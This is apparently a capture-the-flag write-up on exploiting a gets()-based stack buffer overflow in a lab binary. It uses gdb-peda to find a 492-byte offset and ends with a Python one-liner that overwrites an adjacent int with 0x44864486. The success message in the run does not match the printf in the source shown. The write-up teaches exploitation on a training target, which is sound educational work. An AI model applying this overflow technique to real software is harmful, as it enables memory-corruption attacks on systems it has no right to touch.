Let's take a look at the source code...

```
#include <stdio.h>
#include <stdlib.h>

int main()
{
    char buffer[489];
    int g;
    gets(buffer);
    if(g == 0x44864486)
    {
        printf("Your first trainning is complete operative.\n");
    }

}
```

So as we can see here, this program suffers from the same vulnerabillity that level 0 suffered from. The inproper use of the gets() function (really that function shouldn't be used at all).
The buffer is the same size, and the integer is stored right next to the buffer so we should be able to reach the buffer in the same manner.
However this time, the integer is being compared to the hex value 0x44864486 (equivalent to 1149650054 in decimal). This won't be a problem however
since we can just push that value to the integer. That hex value is four bytes (just like ints in 32 bit C programs) so we shouldn't have a problem pushing to it. So our exploit will look like this

```
  filler (x amoubt 0f bytes, around 489) + 0x44864486
```

Unlike the previous problem, we will have to find the exact offset between the char and the int so we can properly set the int equal to 0x44864486. For this, we can use gdb.

```
guyinatuxedo@tux:/Hackery/escape/buf_ovf/b1_64$ gdb ./b1_64 
```

One wall of text later...

```
gdb-peda$ disas main
Dump of assembler code for function main:
   0x0000000000400566 <+0>: push   rbp
   0x0000000000400567 <+1>: mov    rbp,rsp
   0x000000000040056a <+4>: sub    rsp,0x1f0
   0x0000000000400571 <+11>:    lea    rax,[rbp-0x1f0]
   0x0000000000400578 <+18>:    mov    rdi,rax
   0x000000000040057b <+21>:    mov    eax,0x0
   0x0000000000400580 <+26>:    call   0x400450 <gets@plt>
   0x0000000000400585 <+31>:    cmp    DWORD PTR [rbp-0x4],0x44864486
   0x000000000040058c <+38>:    jne    0x400598 <main+50>
   0x000000000040058e <+40>:    mov    edi,0x400628
   0x0000000000400593 <+45>:    call   0x400430 <puts@plt>
   0x0000000000400598 <+50>:    mov    eax,0x0
   0x000000000040059d <+55>:    leave  
   0x000000000040059e <+56>:    ret    
End of assembler dump.
gdb-peda$ b *main+31
Breakpoint 1 at 0x400585
gdb-peda$ r
Starting program: /Hackery/escape/buf_ovf/b1_64/b1_64 
07451238
```

Another wall of text later...

```
Breakpoint 1, 0x0000000000400585 in main ()
gdb-peda$ find 07451238
Searching for '07451238' in: None ranges
Found 2 results, display max 2 items:
 [heap] : 0x602010 ("07451238\n")
[stack] : 0x7fffffffdc70 ("07451238")
gdb-peda$ x $rbp-0x4
0x7fffffffde5c: ""
```

Now that we have the addresses of where the buffer and int are stored, let's user python to figure out the difference.

```
guyinatuxedo@tux:~$ python
Python 2.7.12 (default, Nov 19 2016, 06:48:10) 
[GCC 5.4.0 20160609] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> 0x7fffffffde5c - 0x7fffffffdc70
492
```

So we have the correct offset in order to properly oveerflow the int (492). One thing, due to how C programs read hex values we will have to push the hex in little endian format (least significant bit first). Essentially we will have to break the hex string up into four seperate pieces, and push them on in reverse order (and we ignore the 0x in the beginning). Look at the actual exploit for more detail. 

```
guyinatuxedo@tux:/Hackery/escape/buf_ovf/b1_64$ python -c 'print "1"*492 + "\x86\x44\x86\x44"' | ./b1_64
Just a little bit harder. But not as hard as all of the research you have to do. Level Cleared!
```

And just like that, we pwned the binary. Now let's patch it. 
